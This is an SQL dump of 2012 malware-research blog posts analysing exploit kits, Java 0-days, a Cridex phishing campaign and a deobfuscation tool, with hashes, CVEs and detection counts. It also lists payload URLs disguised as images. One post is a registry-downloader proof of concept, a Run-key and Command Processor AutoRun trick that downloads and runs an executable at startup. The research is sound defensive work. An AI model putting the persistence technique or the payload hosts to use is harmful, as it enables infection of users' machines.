INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (90, 'CrimeBoss Exploit Pack', 'darryl', 'September 13, 2012', 'Earlier this year, the CrimeBoss exploit pack was released in beta form. An updated version was recently seen in the wild.\nHere’s the panel’s login screen which looks just like Crimepack.\n\nBut the rest of the pack is completely different. Here’s the landing page of the exploit pack:\n\nThe second layer is a little more challenging:\n\nOnce you deobfuscate the code, you’ll be rewarded with a neatly written script complete with comments. Here we see the three Java exploits it’s using:\n\nThe next day, the applets were replaced with similar ones:\n\nAs you can see from the above, the visiting computer gets hit by all three Java exploits:\nCVE-2012-4681\nCVE-2011-3544\n“Social Engineering Applet”\nThe last applet is not actually an exploit. It merely tries to convince you that it’s okay to run the applet.\n\nIf you don’t have Java installed, CrimeBoss gives you a chance to install it.\n\nThe text above is in Portuguese, here’s a translation:\n“You do not have Java or it is disabled.\nThis page has features that require Java to be enabled.\nClick here to install the Java plugin.”\nThere are three interesting aspects to this exploit pack. The first is that this pack distributes the parts of its infection chain onto different domains. This makes the pack a little more resilient.\n\nThe second thing is that the payloads are renamed to look like graphic files. Unless you look at the magic numbers, it may not be very obvious that they are executables. Presumably they are hiding in plain sight on these servers. The dropped files range from backdoors to banking Trojans.\ndl.dropbox.com/u/104545784/mda.bmp\nuploads.boxify.me/90831/gforcea.bmp\nandreazza.med.br/xul.gif\ndesperadoradio.nl/phedex/icon.gif\nandreturco.com.br/imgs/a22.gif\nkids-trace-com.web11.redehost.com.br/ams5.jpg\ndl.dropbox.com/u/80789560/phed0015.ico\nThe third is that these Java applets download the malicious payload using a specific useragent string as seen here:\n\nThis translates to this:\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0\nAnother applet used this one:\nMozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\nAt the moment, it does not matter what your useragent string is; you can download these payload files at any time using any browser. But it seems plausible that in the future, CrimeBoss’ sites could restrict a direct download unless you have a matching UA string. This would join the other packs that employ a sessionID, cookie, referer, or UA string check to prevent direct downloads.\nJava Exploits\nFile: java7.jar (CVE-2012-4681)\nMD5: 171bd05e3d9b7b17f206ff0e2beaeddf\nVT: 9/41\nFile: javab.jar (CVE-2011-3544)\nMD5: D679A4EED92C94EF1E75F47F0DDDC2B4\nVT: 4/42\nFile: xul1.jar\nMD5: 80F3F65413F5A7A7E07B8FE17E9943E5\nVT: 4/42\nFile: pka1.jar\nMD5: F2D9B13E224A4AA2F234BF2316E9E30C\nVT: 2/42\nDropped Files\nFile: a22.gif\nMD5: 0a6d3a1505a8f14252b5afc5b71fe800\nVT: 6/42\nFile: gforcea.bmp\nMD5: f30526e804df83a2a30068f1d74faeab\nVT: 4/41\nFile: icon.gif\nMD5: 5045d1c758ac60f50813fdd8188b3ae8\nVT: 6/41\nFile: mda.bmp\nMD5: f474e1d0e4adc3d0b5cba7b17727a4f9\nVT: 2/42\nFile: ams5.jpg\nMD5: c39ddd740e730d27346d325222a2302c\nVT: 1/42\nFile: phed0015.ico\nMD5: 13B86ED2D78EA2C6DBF6CF7EE7EC5206\nVT: 0/42', 'crimeboss, exploit kit, java, javascript obfuscation', 'http://www.kahusecurity.com/?p=12474\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (91, 'Neosploit Gets Java 0-Day', 'darryl', 'September 1, 2012', 'Neosploit has been popping up every once and awhile, quietly infecting users without a whole lot of attention. This past week, its author(s) decided to update Neosploit with the latest Java exploit. It now joins the likes of Blackhole and “RedKit” which have also been updated.\nHere’s the obfuscated exploit page from Neosploit:\n\nWhen you tidy things up, you can see Neosploit’s signature div tags. The function at the top called “cel” is the deobfuscator (which is later renamed to “dor”). The script sends hex strings to this function to get it deobfuscated, for example, “dor(hit,mud)”. We can monitor what is getting passed through it by writing out the “t” variable.\n\nAnother way is to see what’s going on is to view the contents of the div containers. We can do it manually or we can use Revelo. Here I choose the “Intercept DIV Attach with ID” option and enter an asterisk as a wildcard.\n\nAfter you execute it and we get the deobfuscated results:\n\nThe site is now dead but it shows the two different URLs being called up by the script. Each one downloads a Java applet to the user’s computer.\n\nThe first JAR delivers the CVE-2012-1723 exploit:\n\nThe second JAR exploits the latest Java vulnerability, CVE-2012-4681:\n\nIf either succeeds, then a fake AV program gets downloaded and installed on the user’s machine.\nFile: rW7PHE0d.jar (CVE-2012-1723)\nMD5: 70611BC834288033FBC069CAE9F26280\nVT: 2/42\nFile: qU8jMPS9.jar (CVE-2012-4681)\nMD5: 5DD8F610A7538F3096138A5259541973\nVT: 4/41\nFile: BfWJroL5.exe\nMD5: E40C6CB6D999DC69A55D4504EDF930EC\nVT: 10/41', 'CVE-2012-4681, exploit kit, java, javascript deobfuscation, neosploit, revelo', 'http://www.kahusecurity.com/?p=12463\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (92, 'Java 0-Day Using Latest Dadong’s JS Obfuscator', 'darryl', 'August 27, 2012', 'Since everyone knows about this, I can finally share my piece.\nHere’s the landing page which is all Javascript. The script is using “Dadong’s JSXX 0.44 VIP” Javascript obfuscator. This isn’t the first time Dadong’s obfuscator has been used with Chinese packs that carry the latest exploits. This apparently is the latest version. The tamper-proof script uses a technique that acts like callee on steroids as it takes each character’s value and its relative position into account.\n\nOnce deobfuscated, you can see that the script reveals a call to a single Java applet. You can also see some parameter values that are read in by the applet.\n\nThe applet contains two classes. Here we see the main class that includes the 0-day exploit. The other class downloads a binary file, writes it out, and executes it.\n\nVersion 0.44 of Dadong’s JSXX VIP Javascript obfuscator is a marked improvement from the last version I looked at which was 0.41. This version uses similar past tricks like forcing errors and overwriting variables. For example, this variable is rather benign:\nsRjYnQL3=Math.tan;\nOnce the second layer was unpeeled, the script changed its value to something entirely different. Here we see another variable get assigned “eval” then it passes that to our variable so it too becomes “eval” but you won’t know that until it deobfuscates the hex code successfully.\nbAiMAGd8=NcFjn7(‘1Qe4dG*]6zY^k8vb]#&,m8$[x_GD3a]Nj5dsn7[F[8cu[S34Rlc]4r;idpDt*=\'[eEuq4](/[^[email protected]]/g,”));\n:\nsRjYnQL3=bAiMAGd8;\nThe hallmark of Dadong’s Javascript is its tamper-proof code. Inserting or changing any character, switching characters around, adding/subtracting values, etc would all fail so I couldn’t reroute the results to an outside function that I controlled like I did with version 0.41.\nLike the versions before it, the script’s deobfuscation function is stored in a variable. When executed, the function reads in this variable (which is its own code), converts each character to decimal then performs some tricky calculations and regular expressions to decrypt the blob of hex. It’s a brilliant technique!\nThere’s different ways of handling a script like this but when I have time, I like to challenge myself to find a way to pop the result just by using Notepad and a browser. This is one of the more complex scripts I’ve come across and I thought I would deal with this like I would when trying to find a vulnerability in an application.\nI came up with two approaches. The first is a totally out-of-the-box approach which I’ll blog about later. The second was to find a place to inject my own code but since I couldn’t modify anything in the main function, I’ll modify the encrypted hex code!\nI won’t bore you with stepping through the deobfuscation routine but if you walk through it line by line, you will be able to determine that the first line of deobfuscated text will be:\nsRjYnQL3=bAiMAGd8;\nPerfect! As I mentioned earlier, this variable overwrites the previous value of “Math.tan”. But what if I can do this instead:\nsRjYnQL3=alert;\nActually I need to keep the length the same so it’s more like this:\nsRjYnQL3=alert ;\nSo I run Excel and use it like a calculator and recalculate the original hex value from this:\n11C6D1A508C9F33957FE826723E180764A9F\nTo this:\n11C6D1A508C9F33957FDAF6B1CD46732529F\nIt’s a good thing this was at the beginning of the script! Then I replaced the hex code and ran it.\n\nIt worked! Note the very top of the screen, you can see what was done.\n\nFile: applet.jar\nMD5: 4AF58300EE5CD6D61A3EB229AFE0DA9F\nVT: 2/42\nFile: hi.exe or Flash_update.exe\nMD5: 4A55BF1448262BF71707EEF7FC168F7D\nVT: 19/41', 'dadong, java 0-day, javascript deobfuscation', 'http://www.kahusecurity.com/?p=12455\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (93, 'Analyzing a New Exploit Pack', 'darryl', 'August 15, 2012', 'A new exploit pack has recently appeared and is getting a decent amount of drive-by traffic. This pack employs several exploits and includes two different social engineering ploys so there’s something for everyone.\nThis pack can be primarily found on the kein.hk domain so let’s call this the “Kein Exploit Pack”. Here are the parts of this pack that we’ll be analyzing. As you can see, the majority of the exploits used in this pack is outdated but they have little AV coverage. \n\nThe entry page (which is random text) first calls up an external JS file. If you’re an IE user, the external Javascript recreates an AV scan. It will eventually prompt you to download a malicious executable which is being delivered via another server.\n\nIn the background, an iframe opens up. The iframe’d webpage, as seen below, does a few things: 1) opens a Java applet; 2) opens another iframe, and 3) opens a PDF file depending on what Acrobat version you’re running.\n\nIf you’re not running IE then you’ll see a fake YouTube screen which will eventually try to get you to download a Flash update which is the same malicious executable.\n\nMost of the code in the Java applet is readable so we can see that it is exploiting the latest vulnerability. But as luck would have it, JD-GUI can’t open an important class file. The underlying code indicates that this class file has been XOR’d with 0x0A.\n\nSo let’s go ahead and do that. We can now see the contents of this class file which takes in a URL input, writes out the incoming data to a file, then executes it (or registers it as a DLL).\n\nGoing back to the main HTML file we saw earlier, we notice that there was obfuscated Javascript present. Let’s clean that up. It seems straightforward enough until we notice the “callee” function. Based on the script’s logic, it collects all of the alpha characters from the script, determines its length, then uses each of its characters to decrypt the blob of hex. Any tampering of the script will result in an incorrect decryption.\n\nSince the script only uses alpha characters, we can use that to our advantage and deobufscate that hex code easily. We need to carefully make a change to the script, from this:\nreturn uxoDGz.join(”);\nTo this:\n_return=uxoDGz.join(”);\nThen add this to the bottom:\n<script>document.write(“<textarea>”+_return);</script>\nHere’s what it should look like:\n\nWhat we’ve done is re-route the output to an external script that dumps its value to a textbox.\n\nThe deobfuscated script reveals that it determines which version of Acrobat the user has then gives them the appropriate PDF exploit. Both PDF files uses the same obfuscation technique which is to swap characters around. This appears to be good enough to get past most AV scanners.\n\nWhen we deobfuscate it, we can see that it concatenates base64-decoded values with NOP sleds and the shellcode.\n\nHere’s the list of exploits used by the “Kein Exploit Pack”:\nCVE-2007-5659 – Acrobat Collab.collectEmailInfo\nCVE-2008-2992 – Acrobat util.printf\nCVE-2010-0188 – Acrobat LibTiff\nCVE-2011-2110 – Flash AVM\nCVE-2012-1723 – Java Applet Field\nAnd here are the results from VirusTotal:\nFile: dacCILV.pdf\nMD5: 6938e7888e057794b0238351928db343\nVT: 4/42\nFile: VCnpR.pdf\nMD5: 0296d40f6efb173f1f2cff396f603f7f\nVT: 5/41\nFile: mehMcQxhE.jar\nMD5: 5c2b9fbf62804ba80b08433be94bd2df\nVT: 3/40\nFile: Main.swf\nMD5: c7d98d9b5d353f17fa50837af8751048\nVT: 2/42\nFile: scandsk.exe\nMD5: b8249924126b8245d6cac4119a58e307\nVT: 7/42\nMD5: e67fdafa45b788b1a998c75402b0be21\nVT: 9/42', 'deobfuscation, exploit kit, javascript, kein exploit pack', 'http://www.kahusecurity.com/?p=12444\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (94, 'New Chinese Exploit Pack', 'darryl', 'August 2, 2012', 'A Korean news site was recently observed distributing malware. I thought it would be an opportune time to test out my program that attempts to locate malicious scripts on a website. Here’s an excerpt from the results:\n\nLooking at the screenshot above from the bottom up, we see some suspicious content from an IP address. That page gets called by an infected “popupmenu.js” file. And that file gets referenced on the main news page. Good, we know now where to start looking! By the way, the “ad.html” page that gets iframed has an “entropy” value of about 68% which is rather high (see top of the screenshot). This suggests the page has obfuscated Javascript.\nHere’s a screenshot of the “popupmenu.js” file which shows the malicious iframe.\n\nAnd this is the “ad.html” page which has the obfuscated Javascript code. You can see a reference to a new Javascript encrypter, “Yszz 0.7 vip”. The two external Javascript files determine which version of Flash and Java the visiting PCs’ are running.\n\nParts of this pack have been seen before but online sandboxes are showing benign results (suspicious at best):\nhttp://wepawet.iseclab.org/view.php?hash=7214fb5f09ec44e2ad8a32c35518d2ab&t=1330982030&type=js\nhttp://jsunpack.jeek.org/?report=8e5364aec93c64ee34c32882008720b4044cde9f\nDeobfuscating the script is rather easy. You can either surround the script with textarea tags or you can modify the script like so:\n\nHere we see heavy usage of the word “kaixin” which could be reference to a Chinese social networking site. Let’s call this the “KaiXin Exploit Pack” so we can easily reference this pack in the future. Of course we will never know for sure if this is of Chinese origin.\nYou can also see “Gondad” in relation to the Java classes. Searching for “Gondad” revealed several references to past malicious activity. The three JAR files have been renamed as JPGs which makes this look less suspicious.\n\nHere’s what VirusTotal has to say about the JARs:\nFile: l5aR91so.jpg\nVT: 11/41\nMD5: e199eff5d350e401959901231449c309\nFile: tWpjOYK.jpg\nVT: 10/41\nMD5: 16360529ca3e86ed852ef1d3e67dc52e\nFile: ozVmL9EY.jpg\nVT: 0/41\nMD5: 258cfcb08dc97d24e84692bc7ce64028\nLet’s take a look at the last one since no AV could detect it. This JAR abuses the Rhino Script Engine but unlike other Rhino JARs I’ve encountered before, this one is different in that it writes out and executes a VB Script. \n\nThis script obtains the variables from the webpage then writes out an exe file.\n\nThe fourth exploit is a Flash exploit. It gets called into action if the victim’s Flash version is <=10.3.183 or <=11.1.102. Uploading the file to VirusTotal also gives us no hits!\nFile: 15DnK.swf\nVT: 0/41\nMD5: 7fbbfe520dc8ed6cdc884ec27f428b3c\nAnalysis of the SWF file is hampered due to AS obfuscation. The file contains the following strings:\ndoswf.cn\n<doswf version=\"2012 YUnter RRR8899888 >\nThis is related to \"DoSWF - Flash Encryption\" which I\'m running into a few lately. From what I can analyze, the exploit appears to be the FlashPlayer MP4 CPRT. I\'ll need to look into this more closely and will update this post if I have anything new to report.\n\nThe last exploit in its arsenal, exploits the Microsoft XML Core Services vulnerability. The deobfuscated script looks like something Metasploit puts out.\n\nHere’s the shellcode which is XOR’d using 0xBD. The shellcode downloads and executes a file called “0.exe”.\n\nAt least two different binaries were dropped. One was Parite, a virulent, polymorphic file infector and the other was a password stealer.\nFile: 0.exe\nVT: 37/41\nMD5: 6520be89877a01cb5db57256b878e08a\nFile: 0.exe\nVT: 30/40\nMD5: da86c3fa5a9663ef22ef980e69acaee7\nThis is yet another prime example of a Chinese pack packing quite a punch! To recap, the KaiXin Exploit Pack has the following exploits:\nCVE-2011-3544 – Java Rhino\nCVE-2012-0507 – Java Atomic\nCVE-2012-1723 – Java Applet Field\nCVE-2012-0754 – Flash MP4\nCVE-2012-1889 – MS XML Core', 'exploit kit, javascript obfuscation, kaixin', 'http://www.kahusecurity.com/?p=12431\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (95, 'Windows Registry Downloader', 'darryl', 'July 30, 2012', 'I was having a discussion with a non-security person and the topic turned to dangerous file extensions. He eventually asked how a single “.REG” file launch would be dangerous. Aside from messing up configurations, lowering the system’s or browser’s security, and causing havoc in Windows (all of which are good enough reasons), the attacker could also change the browser start page’s URL to point to a drive-by download site by altering one of a few registry keys like this one:\nHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\nBut what else? I haven’t heard of any attacks that could be performed using REG files and a very quick search in Google didn’t reveal anything juicy. Probably because when a REG file is launched, the user needs to allow it.\n\nThis doesn’t make for a good attack. In any case, I wondered if I could add a registry key that could download a file from the Internet and then execute it…a kind of registry downloader. So here’s my first attempt at this:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nTest=http://website/1.exe\n\nLooks like the file attempts to download via Internet Explorer but gets blocked. If I try to execute a local EXE file, then it runs without any warning.\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nTest=file:\\\\c:/1.exe\nThat’s great and all but I still need to get my EXE file onto the computer to run…and do it from the registry. So what if I run a script from the registry which creates a VBS file that downloads and executes my program?\n\nI try to add that to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key and encounter a couple of roadblocks. For one, there’s a size constraint. It seems I can only write out 165 bytes when I use this registry key and my script is at least twice that amount.\nAfter searching the registry for another suitable key, I found one that serves my purpose but requires me to use another key to trigger my script to run. Ah, and more roadblocks. I also need to insert newlines in certain places or else the script won’t run. There’s also certain characters that I need to escape.\nHere’s what my final REG file looks like:\n\nThe file sets up an expandable string key called “AutoRun” in HKCU\\Software\\Microsoft\\Command Processor with the following:\n\nThe startup registry key now becomes the trigger which launches the above key automatically when “cmd” runs at startup. The “/c” switch promptly closes the DOS window but it still flashes on the screen. \nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nStart=cmd /c\nIn this WinXP POC, the calculator program downloaded from a web server and launched automatically without any prompts upon startup. Yeah it’s lame but it was a fun personal challenge.', 'poc, registry downloader', 'http://www.kahusecurity.com/?p=12420\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (96, 'Spear-Phish Leads to Cridex', 'darryl', 'July 10, 2012', 'I haven’t seen a spear-phish campaign like this in awhile. This is a rather decent campaign as it contains the recipient’s full name and address. While the email contains some grammar errors, I think this has the potential to fool a lot of people.\n\nThe email is purportedly sent from a company called “National Processing Company (NPC)” with the following email addresses (probably more):\n[email protected] npc. net\n[email protected] npc. net\n[email protected] npc. net\nThe subject lines use different words to convey the same meaning, just like the email itself. It’s like the spear-phishers used a thesaurus to find synonyms of key words. This was likely done in an attempt to evade spam filters and to give it a greater chance of landing in email in-boxes.\n – Transaction #3434233928 will be cleared within the next 48 hours. Your account will be billed for $1443.93\n – Transaction #9212303923 will be finished in the next 24 hours. Your card will be charged for $3043.35\n – Transaction #8474541903 will be completed in the following 48 hours. Your bank account will be charged for $1965.93\nIf the recipient clicks on the link, they are led to a webpage with the usual malicious Javascript redirect.\n\nThis led to none other than the Blackhole Exploit Kit which used a Java exploit to drop an executable called “calc.exe” which got copied to AppData with the “KB00151121.exe” filename. This binary is a banker Trojan called “Cridex”.\nFilename: V.class\nMD5: EDCB0D8443D790B0B58B540A2B094E5C\nVT: 3 / 42\nFilename: calc.exe / KB00151121.exe\nMD5: B4790A09B20FD4DB9EAFB41284920E46\nVT: 10 / 42\nCridex then pulled down its config/webinjects file over HTTPS. This file (279KB) looks like it has over 200 banks now including Blogger, Facebook, Flickr, LiveJournal, and Twitter.\n\nA security researcher from M86 Security Labs (now Trustwave SpiderLabs) , Daniel Chechik, wrote an excellent article on his analysis of Cridex and covered all the bases. Go and check it out!', 'banking trojan, blackhole, cridex, spear-phish, spearphish', 'http://www.kahusecurity.com/?p=12413\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (97, 'Playing Hide and Seek with Malicious Scripts', 'darryl', 'July 7, 2012', 'When I encounter a drive-by download that involves a compromised host, there will usually be a malicious script somewhere on the website. The “malicious script” could be a meta refresh tag, an iframe, an external Javascript file, or even in a SWF file. Its location can give you a hint as to how the site got compromised as well as to help the webmaster verify and remove the infected file(s).\nOftentimes, these scripts can be found at the top or the bottom of the webpage:\n\nLately, however, I’m noticing that it’s getting harder to find them. Here’s a couple from just this week alone!\nNear the top of an external Javascript file called “site_util.js” is a self-executing function. The lack of formatting made this one stick out.\n\nIn this drive-by, the malicious script was buried in the “jquery.js” file. Do you see it? I nearly missed it myself. (Hint: look for the document.write statement.)\n\nI’m trying to develop a method of identifying malicious scripts and work backwards to locate where they came from. The first hurdle is trying to identify the malicious script. As a malware analyst, we can mostly recognize that a script is suspicious just by looking at it. Here’s an example:\n\nIn the above, Sample #1 is a benign JQuery script. The other two look suspicious. How do you write a program that mimics what our eyes see? Yeah, right, I’m not crazy. What I can do is write a program that identifies “entropy”. (I know that’s not the right word but it’s close enough until I find a better word.) If you look closely at the JQuery script, you can recognize many valid Javascript keywords. While it exists in the other two scripts, there’s not a whole lot. Instead, there’s a ton of random characters and numbers. So what if I write a program to look for randomness, then I might be able to spot malicious scripts. Then I’ll need a way to enumerate all the objects used by a webpage and keep track of what it loads. \nHere are results from actual drive-bys using the above methodology:\nThe main site had an iframe to a local (infected) PHP file. The PHP file had obfuscated Javascript that redirected visitors to an exploit pack.\n\nIn this drive-by, there was an iframe to Blackhole from the main website.\n\nLast one. The main webpage loaded a local file via an iframe which had a meta refresh tag to Blackhole.\n\nLooks promising but I still need to figure out how to find those pesky malicious needles in the proverbial haystack.', 'drive-by, entropy, javascript, obfuscation', 'http://www.kahusecurity.com/?p=12409\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (98, 'JS Obfuscation Using UserAgent String', 'darryl', 'June 24, 2012', 'Here’s an interesting script sent to me by a friend. This script was the first step in the infection chain which redirected the user to an exploit pack.\n\nYou can see above in the red box that the script uses the browser’s UserAgent string to deobfuscate the script. Each users’ visit resulted in unique Javascript code depending on their UA string which suggests there was an on-the-fly JS obfuscator. Each character of the UserAgent string is used which means you have to know the entire string. This means close matches won’t work.\nThe author’s goal was likely to thwart security tools and reseachers as they wouldn’t be able to deobfuscate the script without knowing the exact UserAgent string used. Clever!\nThere are several ways to crack this but below, I just enumerated all the values which was used to XOR the obfuscated code and displayed the result:\n\nHere, you can see the results of our bruteforcing effort:', 'deobfuscation, javascript', 'http://www.kahusecurity.com/?p=12399\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (99, 'Revelo v0.4', 'darryl', 'June 4, 2012', 'I’m trying out some new methods to improve Revelo. This version now includes the following:\n– Added ability to choose the direction of the replacement (e.g. top-down or bottom-up). This might be important if a key value is up at the top and Revelo keeps replacing the one at the bottom.\n– Added ability to choose action method (e.g. textarea, document.write, or alert). I modified the other choices accordingly.\n– Implemented a method to redirect a variable to a particular action.\n\nMost of the feedback and questions I’ve been getting recently was around “how do I deobfuscate Blackhole?” The Blackhole author(s) continually modify their obfuscation methods so I’m not sure which version are giving some of you a hard time. Other methods in Revelo work but I wanted to focus on the new “redirect variable” method.\nRemember, if you are playing with live malicious scripts like Blackhole, use Revelo in a virtual machine! While Revelo won’t redirect you to a malicious site (by default), it will execute exploit code which could launch Java that will redirect you.\nVersion #1\n1. Load up the obfuscated script. Up near the top, you will see “e(c);”. The “e” variable holds “eval” and the “c” variable holds the exploit code. Select the “Redirect Variable” method. Enter the “c” variable as well as the parenthesis around it.\n\n2. Click on “Execute” then go to the “Results “tab.\n\nVersion #2\n1. Load up the obfuscation script and check out the bottom part of the script. You can see “e(“”+s);” at the end. This time the “s” variable contains the exploit code. Select the “Redirect Variable” method once again but this time we want to enter (“”+s).\n\n2. Click on “Execute” then go to the “Results “tab.\n\nMD5: E44564C0B7AB43F250FD83935FC3CBCC\nDownload: http://www.mediafire.com/?obkgmwdzojyve7j', 'blackhole, deobfuscation, javascript, revelo', 'http://www.kahusecurity.com/?p=12393\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (100, 'Wild Wild West – 06/2012', 'sectek', 'June 1, 2012', 'New ones added:\nSweet Orange\n“Red Kit”\n“Gong Da Pack”\nStyx\nCrimeBoss\nIf anyone can share, looking for Nuclear Pack v2', 'exploit kits', 'http://www.kahusecurity.com/?p=12387\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (101, 'Revelo v0.3 Released', 'darryl', 'May 9, 2012', 'In this release, I’ve made a couple of bug fixes. I’m also using a traditional installer which should help the folks who are having trouble registering the OCXs. I tested this out on Windows XP 32-bit and Windows 7 32-bit and 64-bit without issue. Hopefully you won’t have issues too.\nMD5: 76EE13D6B9A6BD5E505AC5CB7E98F73B\nDownload: http://www.mediafire.com/?kdb1enez1og2b85', 'deobfuscator, javascript', 'http://www.kahusecurity.com/?p=12382\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (102, 'Revelo Update', 'darryl', 'May 2, 2012', 'Thank you all for your support and feedback with the release of Revelo (finally, I know)!\nI wrote this program and tested it in Windows XP since I heavily use that in my VMs for analysis. For several of you, you are getting an error message when trying to run it in Vista or 7. My apologies! It was hard enough to write this let alone make it work on all platforms. \nIn this update, I removed an outdated API call which caused the error. This latest version should work fine now on Windows XP through 7, 32-bit and 64-bit. For some of you who helped me test this new version on Windows 7 (thanks), there are apparently some inconsistent issues though (e.g. no messagebox popups, no traffic logs). I’ll have to look into this. Hmm, maybe I need to make a regular installer and not use Enigma Virtual Box. Anyway, I did say this was experimental software, right? If you’re having issues in 7, let me know and use it in XP for the time being.\nI also got a few requests to go through a couple more examples so here we go…\nSample 1\nThis script was found in the wild a couple of days ago. The malicious script was injected into a compromised host at the very top of the page. Interestingly, it started with “<body><script>…” That was a clue. Be sure you copy preceeding tags like this to Revelo as you’ll see why.\nHere’s the script we will be working on:\n\nDepending on what you are trying to accomplish, you can click on “Execute” and the redirect URL will appear. All done!\n\nIf you click on the “Element Tree” or “Element Detail” tabs, you can see that an iframe was created by the script.\n\nIf you want to take this further then we have to pick this script apart a bit. You’ll notice there’s a lot hex characters here. You could go through each section and replace the hex with ASCII so you can see what the script is doing. For example, we see this:\nvar d=document[‘\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74’](‘\\x69\\x6e\\x70\\x75\\x74’);\nIf you convert the hex values, you’ll get this:\nvar d=document[‘createElement’](‘input’);\nYou could also do a search/replace, being careful not to wipe out something important. Or you can let the browser clean it up for you…\n\nI just wrapped the code with “alert(unescape(” and looked at the result. Keep in mind when you do something like this, there may be some unintended consequences. If I paste the result back to Revelo, the script won’t run correctly as something broke. All we’re doing here is trying to understand what the script is doing. By the way, you can do a control-a then control-c to select-all and copy the messagebox contents.\n\nHere we see why it needed the “<body>” tag. Okay, we now know that this script uses DOM.\n\nAnd then we find this:\n\nSo back at Revelo, we can choose the “Intercept DIV Attach with ID” and type in the letter “l”:\n\nYou might have noticed too that the script defined attibutes for the element so we can select “Intercept DOM with Variable” and enter “l” then check out the bottom part of the results:\n\nSample 2\nI also found this script in the wild a few days ago.\n\nClicking on “Execute” shows us the redirect:\n\nSeems easy enough, we just use “Replace Verbs…” or “Redirect Eval…” options then go to the “Results” tab:\n\nIt’s using cookies so subsequent visits won’t work! Let’s first copy this over to the main tab. Then get rid of the cookie check. You can delete it (and fix up the rest of the script) or change the logic.\n\nNotice the “document.write” call? Let’s “Redirect Doc.Write to TextArea” and see the results:\n\nI added a neutered version of the above two scripts in the documentation so you can give them a try yourself. Same disclaimer as before. Have fun!\nMD5: 83004DEB60FC9765AA09441F4F139E26\nDownload: http://www.mediafire.com/?6rdb8bwjo9jdylj', 'deobfuscation, javascript, revelo', 'http://www.kahusecurity.com/?p=12381\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (103, 'Revelo – Javascript Deobfuscator', 'darryl', 'May 1, 2012', 'I mentioned a new tool I’ve been developing to help with Javascript deobfuscation months ago. I’ve been working on it off and on but it’s taking me awhile. There’s still more to do but I think it’s ready for a public release. Consider this tool experimental!\nThe purpose of this program is to assist the user in analyzing obfuscated Javascript code, particularly those that redirect the browser to malicious URLs. My hope is that this tool helps you learn more about deobfuscation and eventually shed the need to use these training wheels.\nThe tool works by writing the Javascript with some user-based modifcations to an HTML file, opening the file inside of the tool, and extracting deobfuscated elements using the Internet Explorer engine. This tool does rely on the user to make some choices based on some understanding of the obfuscated script.\nWhile this tool does have some protections built into it, it may execute malicious code that could harm your computer so use it in a virtual machine. It’s been tested to run on Windows XP. There’s a helper document inside the zip file which includes safe samples to play with.\nFeatures:\n* Analyze a script quickly by loading a file or pasting in Javascript code\n* Includes several methods to deobfuscate Javascript\n* Includes a built-in browser proxy which displays the URL of outgoing requests\n* Displays the Document Object Model (DOM) elements\n* Includes a packet sniffer which logs incoming and outgoing requests\n* Includes a software firewall to prevent the program from accessing Internet content accidentally\n* Ability to act as a web proxy to catch and block redirects\n* Beautifies Javascript code to make it more readable\n* Ability to clear the browser cookies\n* Ability to spoof the user-agent string\nBefore I show you how this works on some live samples, I should tell you about one new thing I’m trying out. I like portable apps but my tool is not since it relies on several OCX controls. I wanted to virtualize it but VMWare ThinApp was not an option due to the high cost. After searching a bit, I found several other options: \nPortableApps\nBoxedApp\nMoleBox\nJauntePE\nCameyo\nEnigma Virtual Box\nAfter looking into each one and testing some of them out, I found Enigma Virtual Box to be the best for me. It’s flexible, has a small footprint, and it’s free! Caveat is that it may trigger AV.\nNow onto the samples…\nSample 1\n=======\nHere’s what we are trying to deobfuscate:\n\nYou can leave the options alone and just click on the “Execute” button. If it’s a redirect, you’ll see the URL pop up.\n\nIf you go to the “Traffic Detail” tab, you can see the GET requests made by the script. Because the program’s Internet Connectivity option (left panel) is set to “block”, the requests were dropped and never left your PC. Notice also that this script sets a cookie. If you don’t clear the cookie after each execute, the script may not do anything.\n\nOn the main tab, let’s scroll down to the bottom of the script. You can see there’s an eval call, a strange-looking call, and a likely variable.\n\nLet’s use the “Intercept Function with Name” method and copy/paste that decodeURIComponent call then go to the “Results” tab. Cool…we just got the hex values of the deobfuscated script!\n\nLet’s do one better. Let’s use the same method and copy/paste the eval call instead.\n\nIf you’re not getting the results you want or if you like to manually deobfuscate scripts then you can click on the “Unmodified Request” option and make manual changes to the script yourself like so:\n\nSample 2\n=======\nDOM-based scripts, like this one, give a lot of tools headaches. What this tool does is enumerate the DOM objects and display what’s there.\n\nLet’s just click on “Execute” so we can see if there’s a redirect:\n\nNow let’s see the DOM elements so click on both of those tabs. Note: you may need to click on “Execute” twice to get the elements to populate.\n\nLet’s analyze the script further. This code is messy so let’s beautify it. Click on “Beautify” then “Copy to Main”. You will have to fix the HTML code (e.g. script 